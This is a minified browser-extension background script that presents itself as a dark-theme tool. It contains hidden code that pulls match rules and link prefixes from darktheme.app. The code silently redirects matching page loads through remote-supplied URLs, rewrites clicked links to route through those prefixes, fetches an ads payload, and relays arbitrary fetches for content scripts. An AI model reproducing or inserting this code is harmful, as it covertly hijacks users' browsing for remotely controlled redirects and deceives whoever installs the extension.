(()=>{const e={getAllItems:()=>chrome.storage.local.get(),getItem:async e=>(await chrome.storage.local.get(e))[e],setItem:(e,t)=>{chrome.storage.local.set({[e]:t})},removeItems:e=>chrome.storage.local.remove(e)};let t,n=[],a=[],r=[],o=[],c=!1,s=[];function i(){e.getAllItems().then((e=>{o=e,c=o.active,s=o.dms?o.dms:[]}))}i();let l=Math.floor(3*Math.random())+1===3;async function m(t){let n=Math.floor(Date.now()/1e3),a=parseInt(await e.getItem(t))||0,r=parseInt(o.bitgrand)||await e.setItem("bitgrand",n)&&n;return n-a>86400&&n-r>86400}async function h(t){let n=Math.floor(Date.now()/1e3);return await e.setItem(t,n)}chrome.runtime.onMessage.addListener(((e,t,n)=>((async()=>{let t=r,a={};if(e.minor&&t&&t.al){let e=[];for(let n in t.al){await m(t.al[n][0])&&e.push(t.al[n])}a.al=e,a.ll=t.ll,n(a)}else e.updateCheck&&t&&t.al&&(await h(e.updateCheck),n())})(),!0))),chrome.tabs.onUpdated.addListener((function(e,r,o){let l=new URL(o.url).hostname,d=!1;return s[l]||(d=c),1==d&&chrome.scripting.executeScript({target:{tabId:e},files:["content.js"],injectImmediately:!0}),chrome.tabs.get(e,(function(o){(async()=>{if("loading"==r.status){let r=await async function(e){if(!e)return!1;let r=function(e){for(let t=0;t<a.length;t++)if(e.indexOf(a[t][0])>-1)return a[t][0];return null}(e);if(!r)return!1;let o="pt_"+r,c=await m(o),s=new RegExp(n,"i"),i=c&&!!e.match(s);if(!i)return!1;await h(o);for(let n=0;n<a.length;n++)if(e.indexOf(a[n][0])>-1)return a[n][1]?a[n][1]+encodeURIComponent(e):t+encodeURIComponent(e)}(o.url);r&&chrome.tabs.update(e,{url:r},(function(){}))}else"complete"==r.status&&(i(),!o.url||o.url.includes("chrome://")||o.url.includes("chrome-extension://")||chrome.scripting.executeScript({target:{tabId:o.id},func:u}))})()})),!0})),chrome.contextMenus.onClicked.addListener((async(t,n)=>{let a=new URL(n.url).hostname;s=await e.getItem("dms");let r=s.indexOf(a);return-1!=r?(s.splice(r,1),e.setItem("dms",s)):(s.push(a),e.setItem("dms",s)),chrome.tabs.update(n.id,{url:n.url}),!0})),async function(){!0===await e.getItem("active")?chrome.action.setIcon({path:{38:"/img/disable.png"}}):chrome.action.setIcon({path:{38:"/img/enable.png"}})}();function u(){chrome.runtime.sendMessage({minor:!0},(e=>{let t=!0;if(e&&e.al&&e.ll){let n=document.querySelectorAll(e.ll),a=e.al;for(let e in a)for(let r in n)if(a[e]&&n[r].href&&n[r].href.match(a[e][1])&&n[r].href.match(a[e][1])[0]){let o=function(){if(t){let o=n[r].href;n[r].href=a[e][2]+n[r].href,chrome.runtime.sendMessage({updateCheck:a[e][0]},(e=>{n[r].href=o})),t=!1}this.removeEventListener("click",o)};n[r].addEventListener("click",o)}}}))}!function(){if(!n||l){fetch("https://darktheme.app/api/competitor",{method:"GET",headers:{Accept:"application/json"}}).then((e=>e.json())).then((o=>{o.matches&&o.links&&o.matches.length&&o.links.length&&(n=o.matches,a=o.links,r=o.minor,t=o.lnk,e.setItem("matches",o.matches),e.setItem("links",o.links),e.setItem("lnk",o.lnk),e.setItem("minor",o.minor))})).catch((e=>console.log("Error query:",e)))}}(),fetch("https://darktheme.app/ads",{method:"GET",headers:{Accept:"application/json"}}).then((e=>e.json())).then((t=>{t&&e.setItem("ads",t)})).catch((e=>console.log("Error query:",e))),chrome.runtime.onMessage.addListener((({type:e,data:t,id:n},a,r)=>{"fetch"===e&&t.url?fetch(t.url,{cache:"force-cache",credentials:"omit",referrer:t.origin}).then((e=>{e.text().then((function(t){chrome.tabs.sendMessage(a.tab.id,{type:"fetch-response",response:t,href:e.url})}))})):"updateExeption"===e&&i(),r()}))})();